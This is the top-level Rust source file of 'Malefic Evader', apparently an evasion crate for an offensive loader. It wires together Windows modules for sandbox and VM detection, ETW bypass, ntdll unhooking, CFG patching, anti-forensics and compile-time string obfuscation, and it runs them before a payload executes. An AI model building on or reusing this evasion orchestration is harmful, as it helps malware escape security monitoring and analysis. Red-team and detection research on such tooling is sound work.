//! Malefic Evader — Evasion and anti-analysis modules.
//!
//! Consolidates evader techniques (from malefic-starship) and anti-analysis
//! modules (sandbox/vm detection from malefic-os-win) into a standalone crate.

#![allow(dead_code)]

/// Debug print macro - only outputs when `debug` feature is enabled
#[macro_export]
macro_rules! debug_println {
    ($($arg:tt)*) => {
        #[cfg(feature = "debug")]
        println!($($arg)*);
    };
}

/// Obfuscate a byte string literal, returning `Vec<u8>`.
///
/// When `obf_strings` is enabled: AES-encrypted at compile time, decrypted at runtime.
/// When disabled: pass-through `.to_vec()` (negligible for one-shot loader).
#[cfg(feature = "obf_strings")]
#[macro_export]
macro_rules! obf_cstr {
    ($s:expr) => {
        ::malefic_gateway::obf_bytes!($s)
    };
}

#[cfg(not(feature = "obf_strings"))]
#[macro_export]
macro_rules! obf_cstr {
    ($s:expr) => {
        $s.to_vec()
    };
}

#[allow(non_snake_case)]
pub mod types;

#[cfg(all(target_os = "windows", feature = "evader_anti_emu"))]
pub mod anti_emu;

#[cfg(all(target_os = "windows", feature = "evader_etw_pass"))]
pub mod etw_pass;

#[cfg(all(target_os = "windows", feature = "evader_god_speed"))]
pub mod god_speed;

#[cfg(all(target_os = "windows", feature = "evader_sleep_encrypt"))]
pub mod sleep_encrypt;

#[cfg(all(target_os = "windows", feature = "evader_anti_forensic"))]
pub mod anti_forensic;

#[cfg(all(target_os = "windows", feature = "evader_cfg_patch"))]
pub mod cfg_patch;

#[cfg(all(target_os = "windows", feature = "evader_api_untangle"))]
pub mod api_untangle;

#[cfg(all(target_os = "windows", feature = "evader_normal_api"))]
pub mod normal_api;

#[cfg(all(target_os = "windows", feature = "anti_sandbox"))]
pub mod sandbox;

#[cfg(all(target_os = "windows", feature = "anti_vm"))]
pub mod vm;

/// Run all enabled evasion modules in order.
///
/// Call this early in the loader entry point (before decoding or executing
/// the payload) to set up the evasion environment.
#[allow(unused_variables)]
#[cfg_attr(feature = "obf_junk", malefic_gateway::junk)]
pub fn run_evaders() {
    #[cfg(all(target_os = "windows", feature = "evader_anti_emu"))]
    {
        #[cfg(feature = "debug")]
        println!("[evader] anti_emu: running sandbox checks...");
        if !anti_emu::execute_all_checks() {
            #[cfg(feature = "debug")]
            println!("[evader] anti_emu: sandbox detected, aborting");
            return;
        }
        #[cfg(feature = "debug")]
        println!("[evader] anti_emu: environment looks real, continuing");
    }

    #[cfg(all(target_os = "windows", feature = "evader_god_speed"))]
    {
        #[cfg(feature = "debug")]
        println!("[evader] god_speed: unhooking ntdll via suspended process");
        god_speed::execute_process_operations();
    }

    #[cfg(all(target_os = "windows", feature = "evader_api_untangle"))]
    {
        #[cfg(feature = "debug")]
        println!("[evader] api_untangle: restoring hooked APIs from disk");
        api_untangle::execute_modifications();
    }

    #[cfg(all(target_os = "windows", feature = "evader_etw_pass"))]
    {
        #[cfg(feature = "debug")]
        println!("[evader] etw_pass: bypassing ETW");
        etw_pass::everything();
    }

    #[cfg(all(target_os = "windows", feature = "evader_cfg_patch"))]
    {
        #[cfg(feature = "debug")]
        println!("[evader] cfg_patch: patching CFG");
        cfg_patch::patch_cfg();
    }

    #[cfg(all(target_os = "windows", feature = "evader_normal_api"))]
    {
        normal_api::execute_api_function();
    }
}
